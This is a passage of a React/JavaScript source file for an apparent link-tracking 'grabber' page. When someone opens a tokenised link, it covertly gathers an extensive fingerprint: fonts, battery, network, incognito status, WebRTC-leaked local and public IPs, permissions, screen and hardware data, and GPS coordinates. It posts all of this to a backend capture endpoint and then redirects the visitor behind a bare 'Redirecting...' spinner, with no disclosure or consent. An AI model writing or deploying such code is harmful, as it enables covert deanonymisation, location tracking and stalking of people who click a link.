      "Gloucester MT Extra Condensed","Haettenschweiler","Helvetica","Impact","Lucida Console",
      "Lucida Sans","Lucida Sans Unicode","Malgun Gothic","Marlett","Microsoft Himalaya",
      "Microsoft JhengHei","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Sans Serif",
      "Microsoft Tai Le","Microsoft Uighur","Microsoft Yi Baiti","MingLiU-ExtB","Modern",
      "Mongolian Baiti","Myanmar Text","Nirmala UI","Palatino Linotype","Roboto","Open Sans",
      "Segoe Print","Segoe Script","Segoe UI","Segoe UI Historic","Segoe UI Emoji",
      "Segoe UI Symbol","SimSun","Simplified Arabic","Tahoma","Times New Roman","Trebuchet MS",
      "Tunga","Ubuntu","Verdana","Webdings","Wingdings","Wingdings 2","Wingdings 3",
      "Yu Gothic","Yu Mincho","Gill Sans MT","Futura","Optima",
    ];
    const canvas = document.createElement("canvas");
    const ctx = canvas.getContext("2d");
    const testString = "mmmmmmmmmmlli!@#$%";
    const testSize = "72px";
    const baseWidths = {};
    ["monospace","sans-serif","serif"].forEach(base => {
      ctx.font = `${testSize} ${base}`;
      baseWidths[base] = ctx.measureText(testString).width;
    });
    const detected = fontList.filter(font =>
      ["monospace","sans-serif","serif"].some(base => {
        ctx.font = `${testSize} '${font}', ${base}`;
        return ctx.measureText(testString).width !== baseWidths[base];
      })
    );
    let fingerprint = 0;
    detected.forEach(f => { for (let i = 0; i < f.length; i++) { fingerprint = (fingerprint << 5) - fingerprint + f.charCodeAt(i); fingerprint |= 0; } });
    return {
      fontsDetected: detected.length,
      fontsList: detected.slice(0, 20).join(", "),
      fontFingerprint: "font-" + fingerprint.toString(16),
    };
  } catch { return {}; }
}

async function getBatteryInfo() {
  try {
    if (!navigator.getBattery) return {};
    const battery = await navigator.getBattery();
    return {
      batteryLevel: Math.round(battery.level * 100),
      batteryCharging: battery.charging,
      batteryChargingTime: battery.chargingTime !== Infinity ? battery.chargingTime : null,
      batteryDischargingTime: battery.dischargingTime !== Infinity ? battery.dischargingTime : null,
    };
  } catch { return {}; }
}

function getNetworkInfo() {
  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  if (!conn) return {};
  return {
    connectionType: conn.effectiveType || null,
    connectionDownlink: conn.downlink || null,
    connectionRtt: conn.rtt || null,
    connectionSaveData: conn.saveData ?? null,
    connectionDownlinkMax: conn.downlinkMax || null,
  };
}

async function detectIncognito() {
  try {
    if (navigator.storage && navigator.storage.estimate) {
      const { quota } = await navigator.storage.estimate();
      return quota < 120 * 1024 * 1024;
    }
    return null;
  } catch { return null; }
}

async function getStorageInfo() {
  try {
    const estimate = await navigator.storage?.estimate();
    return {
      storageQuota: estimate?.quota ? Math.round(estimate.quota / 1024 / 1024) + " MB" : null,
      storageUsage: estimate?.usage ? Math.round(estimate.usage / 1024 / 1024) + " MB" : null,
      localStorageEnabled: (() => { try { localStorage.setItem("t","1"); localStorage.removeItem("t"); return true; } catch { return false; } })(),
      sessionStorageEnabled: (() => { try { sessionStorage.setItem("t","1"); sessionStorage.removeItem("t"); return true; } catch { return false; } })(),
      indexedDBEnabled: !!window.indexedDB,
      cacheAPIEnabled: String(!!window.caches),
      cookiesCount: document.cookie.split(";").filter(c => c.trim()).length,
    };
  } catch { return {}; }
}

async function getMediaDevices() {
  try {
    if (!navigator.mediaDevices?.enumerateDevices) return {};
    const devices = await navigator.mediaDevices.enumerateDevices();
    return {
      cameras: devices.filter(d => d.kind === "videoinput").length,
      microphones: devices.filter(d => d.kind === "audioinput").length,
      speakers: devices.filter(d => d.kind === "audiooutput").length,
    };
  } catch { return {}; }
}

function getSpeechVoices() {
  try {
    if (!window.speechSynthesis) return {};
    const voices = window.speechSynthesis.getVoices();
    return {
      speechVoicesCount: voices.length,
      speechVoices: voices.slice(0, 6).map(v => v.name).join(", ") || null,
    };
  } catch { return {}; }
}

function getPluginInfo() {
  try {
    const plugins = Array.from(navigator.plugins || []).map(p => p.name);
    const mimes = Array.from(navigator.mimeTypes || []).map(m => m.type);
    return {
      pluginsCount: plugins.length,
      plugins: plugins.slice(0, 10).join(", ") || null,
      mimeTypes: mimes.slice(0, 8).join(", ") || null,
    };
  } catch { return {}; }
}

function getPerformanceInfo() {
  try {
    const perf = performance.getEntriesByType("navigation")[0];
    const mem = performance.memory;
    return {
      pageLoadTime: perf ? Math.round(perf.loadEventEnd - perf.startTime) + " ms" : null,
      domContentLoaded: perf ? Math.round(perf.domContentLoadedEventEnd - perf.startTime) + " ms" : null,
      dnsLookupTime: perf ? Math.round(perf.domainLookupEnd - perf.domainLookupStart) + " ms" : null,
      tcpConnectTime: perf ? Math.round(perf.connectEnd - perf.connectStart) + " ms" : null,
      ttfb: perf ? Math.round(perf.responseStart - perf.requestStart) + " ms" : null,
      memoryUsed: mem ? Math.round(mem.usedJSHeapSize / 1024 / 1024) + " MB" : null,
      memoryTotal: mem ? Math.round(mem.totalJSHeapSize / 1024 / 1024) + " MB" : null,
      memoryLimit: mem ? Math.round(mem.jsHeapSizeLimit / 1024 / 1024) + " MB" : null,
    };
  } catch { return {}; }
}

async function getWebRTCIPs() {
  try {
    const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
    pc.createDataChannel("");
    await pc.createOffer().then(offer => pc.setLocalDescription(offer));
    return new Promise((resolve) => {
      const localIPs = new Set();
      const publicIPs = new Set();
      pc.onicecandidate = (e) => {
        if (!e.candidate) {
          pc.close();
          resolve({ webrtcLocalIP: [...localIPs].join(", ") || null, webrtcPublicIP: [...publicIPs].join(", ") || null, webrtcSupport: "true" });
          return;
        }
        const cand = e.candidate.candidate;
        const ipv4 = cand.match(/(\d{1,3}(\.\d{1,3}){3})/g) || [];
        ipv4.forEach(ip => {
          if (ip.startsWith("192.168.") || ip.startsWith("10.") || ip.startsWith("172.")) localIPs.add(ip);
          else publicIPs.add(ip);
        });
      };
      setTimeout(() => { pc.close(); resolve({ webrtcLocalIP: [...localIPs].join(", ") || null, webrtcPublicIP: [...publicIPs].join(", ") || null, webrtcSupport: "true" }); }, 2000);
    });
  } catch { return { webrtcLocalIP: null, webrtcPublicIP: null, webrtcSupport: "false" }; }
}

async function getPermissions() {
  const check = async (name) => { try { const r = await navigator.permissions.query({ name }); return r.state; } catch { return null; } };
  if (!navigator.permissions) return {};
  const results = await Promise.allSettled([
    check("geolocation"), check("notifications"), check("camera"), check("microphone"),
    check("accelerometer"), check("gyroscope"), check("magnetometer"),
    check("clipboard-read"), check("clipboard-write"),
  ]);
  const val = r => r.status === "fulfilled" ? r.value : null;
  return {
    geolocationPermission: val(results[0]),
    notificationsPermission: val(results[1]),
    cameraPermission: val(results[2]),
    microphonePermission: val(results[3]),
    accelerometerPermission: val(results[4]),
    gyroscopePermission: val(results[5]),
    magnetometerPermission: val(results[6]),
    clipboardReadPermission: val(results[7]),
    clipboardWritePermission: val(results[8]),
  };
}

function getScreenInfo() {
  const mq = (q) => { try { return window.matchMedia(q).matches; } catch { return null; } };
  return {
    screenWidth: window.screen.width,
    screenHeight: window.screen.height,
    screenAvailWidth: window.screen.availWidth || null,
    screenAvailHeight: window.screen.availHeight || null,
    colorDepth: window.screen.colorDepth || null,
    pixelDepth: window.screen.pixelDepth || null,
    pixelRatio: window.devicePixelRatio || null,
    windowWidth: window.innerWidth || null,
    windowHeight: window.innerHeight || null,
    orientation: window.screen.orientation?.type || null,
    orientationAngle: window.screen.orientation?.angle ?? null,
    outerWidth: window.outerWidth || null,
    outerHeight: window.outerHeight || null,
    hdrSupport: mq("(dynamic-range: high)") ? "HDR" : "SDR",
    colorGamut: mq("(color-gamut: p3)") ? "p3" : mq("(color-gamut: rec2020)") ? "rec2020" : "srgb",
    forcedColors: mq("(forced-colors: active)") ? "active" : "none",
    invertedColors: mq("(inverted-colors: inverted)") ? "inverted" : "none",
    prefersColorScheme: mq("(prefers-color-scheme: dark)") ? "dark" : "light",
    prefersReducedMotion: mq("(prefers-reduced-motion: reduce)") ? "reduce" : "no-preference",
    cssPxDensity: window.devicePixelRatio ? Math.round(window.devicePixelRatio * 96) + " dpi" : null,
  };
}

function getFeatureSupport() {
  return {
    webSocketSupport: !!window.WebSocket,
    webWorkerSupport: !!window.Worker,
    serviceWorkerSupport: "serviceWorker" in navigator,
    webAssemblySupport: !!window.WebAssembly,
    bluetoothSupport: "bluetooth" in navigator,
    usbSupport: "usb" in navigator,
    gamepadSupport: String(!!navigator.getGamepads),
    xrSupport: String(!!navigator.xr),
    offscreenCanvasSupport: String(!!window.OffscreenCanvas),
    sharedArrayBufferSupport: String(!!window.SharedArrayBuffer),
    broadcastChannelSupport: String(!!window.BroadcastChannel),
    paymentRequestSupport: String(!!window.PaymentRequest),
    credentialMgmtSupport: String(!!(navigator.credentials && navigator.credentials.get)),
    presentationSupport: String(!!(navigator.presentation)),
  };
}

async function collectAllDeviceInfo() {
  const [battery, incognito, mediaDevices, storageInfo, audioFingerprint, webrtcIPs, permissions] = await Promise.all([
    getBatteryInfo(), detectIncognito(), getMediaDevices(),
    getStorageInfo(), getAudioFingerprint(), getWebRTCIPs(), getPermissions(),
  ]);

  const gpuInfo = getWebGLInfo();
  const network = getNetworkInfo();
  const canvasHash = getCanvasFingerprint();
  const canvasGeometryHash = getCanvasGeometryHash();
  const cssHash = getCSSHash();
  const fontInfo = getFontInfo();
  const speech = getSpeechVoices();
  const plugins = getPluginInfo();
  const perf = getPerformanceInfo();
  const screen = getScreenInfo();
  const features = getFeatureSupport();
  const now = new Date();

  const jan = new Date(now.getFullYear(), 0, 1).getTimezoneOffset();
  const jul = new Date(now.getFullYear(), 6, 1).getTimezoneOffset();
  const dstActive = Math.min(jan, jul) !== now.getTimezoneOffset() ? "Yes" : "No";

  const ua = navigator.userAgent;
  let browserVersion = null;
  try {
    const m = ua.match(/Edg\/([0-9.]+)/) || ua.match(/Chrome\/([0-9.]+)/) || ua.match(/Firefox\/([0-9.]+)/) || ua.match(/Version\/([0-9.]+).*Safari/);
    browserVersion = m?.[1] || null;
  } catch {}

  let architecture = null;
  try {
    if (ua.includes("WOW64") || ua.includes("Win64") || ua.includes("x64")) architecture = "x64";
    else if (/arm/i.test(ua)) architecture = "ARM";
  } catch {}

  return {
    appName: navigator.appName || null,
    appVersion: navigator.appVersion?.substring(0, 80) || null,
    product: navigator.product || null,
    buildID: navigator.buildID || null,
    vendor: navigator.vendor || null,
    javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
    pdfViewerEnabled: navigator.pdfViewerEnabled || null,
    cookiesEnabled: navigator.cookieEnabled || null,
    doNotTrack: navigator.doNotTrack || null,
    historyLength: window.history.length || null,
    referrer: document.referrer || null,
    language: navigator.language || null,
    languages: navigator.languages ? navigator.languages.join(", ") : null,
    platform: navigator.platform || null,
    userAgent: ua,
    browserVersion,
    cpuCores: navigator.hardwareConcurrency || null,
    ram: navigator.deviceMemory || null,
    maxTouchPoints: navigator.maxTouchPoints || null,
    touchSupport: "ontouchstart" in window || navigator.maxTouchPoints > 0,
    pointerType: window.PointerEvent ? "pointer" : "mouse",
    architecture,
    ...gpuInfo,
    ...screen,
    ...battery,
    ...network,
    localTime: now.toLocaleString("en-IN", { timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone }),
    clientTimezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    timezoneOffset: now.getTimezoneOffset(),
    dstActive,
    incognito: incognito ?? null,
    adBlockDetected: (() => {
      try {
        const el = document.createElement("div");
        el.className = "adsbox ad-unit ads advertisement pub_300x250";
        el.style.position = "absolute"; el.style.left = "-9999px";
        document.body.appendChild(el);
        const blocked = el.offsetHeight === 0 || el.offsetWidth === 0 || getComputedStyle(el).display === "none";
        document.body.removeChild(el);
        return blocked;
      } catch { return null; }
    })(),
    canvasHash,
    canvasGeometryHash,
    audioFingerprint,
    cssHash,
    ...mediaDevices,
    ...storageInfo,
    ...fontInfo,
    ...speech,
    ...plugins,
    ...perf,
    ...webrtcIPs,
    ...permissions,
    ...features,
  };
}

export default function TrackingCapture() {
  const { token } = useParams();
  const hasSent = useRef(false);
  const { location, loading } = useGeoGrabber();

  useEffect(() => {
    if (loading) return;
    if (hasSent.current) return;
    const key = getCaptureKey(token);
    if (sessionStorage.getItem(key)) return;
    hasSent.current = true;
    sessionStorage.setItem(key, "1");
    sendCapture(location);
  }, [loading]);

  async function sendCapture(loc) {
    try {
      const deviceInfo = await collectAllDeviceInfo();
      const payload = {
        token,
        gpsLat: loc?.source === "gps" ? (loc.lat || null) : null,
        gpsLon: loc?.source === "gps" ? (loc.lon || null) : null,
        gpsAccuracy: loc?.source === "gps" ? (loc.gpsAccuracy || null) : null,
        gpsAltitude: loc?.source === "gps" ? (loc.altitude || null) : null,
        gpsSpeed: loc?.source === "gps" ? (loc.speed || null) : null,
        gpsHeading: loc?.source === "gps" ? (loc.heading ? Math.round(loc.heading) + "°" : null) : null,
        ...deviceInfo,
      };
      const res = await fetch(BACKEND_URL + "/api/links/capture", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
      const data = await res.json();
      if (data.destinationUrl) {
        window.location.replace(data.destinationUrl);
      }
    } catch (err) {
      console.error("[TrackingCapture] error:", err);
    }
  }

  return (
    <div style={{ margin: 0, minHeight: "100vh", background: "#ffffff", display: "flex", alignItems: "center", justifyContent: "center", fontFamily: "Arial, sans-serif", color: "#999", fontSize: 13 }}>
      <div style={{ textAlign: "center" }}>
        <div style={{ marginBottom: 12 }}>
          <svg width="32" height="32" viewBox="0 0 38 38" xmlns="http://www.w3.org/2000/svg" stroke="#ccc">
            <g fill="none" fillRule="evenodd">
              <g transform="translate(1 1)" strokeWidth="2">
                <circle strokeOpacity=".3" cx="18" cy="18" r="18"/>
                <path d="M36 18c0-9.94-8.06-18-18-18">
                  <animateTransform attributeName="transform" type="rotate" from="0 18 18" to="360 18 18" dur="1s" repeatCount="indefinite"/>
                </path>
              </g>
            </g>
          </svg>
        </div>
        Redirecting...
      </div>
    </div>
  );
}